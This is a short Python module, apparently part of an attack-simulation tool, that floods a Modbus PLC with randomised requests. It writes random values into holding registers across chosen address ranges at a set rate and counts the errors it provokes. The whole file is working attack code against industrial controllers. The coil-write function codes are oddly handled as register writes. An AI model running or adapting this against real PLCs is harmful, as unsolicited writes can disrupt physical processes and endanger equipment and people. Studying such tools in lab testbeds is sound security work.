from injector.core.logging_setup import setup
from legacy.modbus_util import modbus_client
import time, random, logging
log = logging.getLogger("plc.attack.scan")

def run(plc_host, plc_port, unit_id, addr_ranges, function_codes, qps=50, duration_s=30):
    setup("INFO")
    addrs = [a for lo,hi in addr_ranges for a in range(lo,hi+1)]
    delay = 1.0/max(1,qps)
    exc = 0
    t0 = time.time()
    with modbus_client(plc_host, plc_port) as c:
        while time.time() - t0 < duration_s:
            fc = random.choice(function_codes); addr = random.choice(addrs)
            try:
                if fc == 3: c.read_hr(addr, count=1, unit=unit_id)
                elif fc == 1: c._try(c.c.read_coils, addr, count=1, unit=unit_id)  # may raise
                elif fc in (5,6): c.write_hr(addr, value=random.randint(0,65535), unit=unit_id)
                elif fc in (15,16): c.write_hrs(addr, [1,2], unit=unit_id)
            except Exception:
                exc += 1
            time.sleep(delay)
    log.info(f"SCAN done, exceptions={exc}")
